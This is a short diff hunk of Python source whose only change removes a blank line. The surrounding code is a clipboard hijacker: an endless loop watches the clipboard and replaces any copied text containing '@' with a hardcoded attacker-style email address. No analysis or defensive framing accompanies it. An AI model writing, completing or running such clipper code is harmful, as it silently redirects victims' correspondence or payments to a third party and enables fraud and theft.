@@ -4,7 +4,6 @@ em='XXX@MAIL.RU'
 des=''
 while True:
     s=pyperclip.paste()
-
     if "@" in s and (s != des):      
         pyperclip.copy(em)
         print(em)
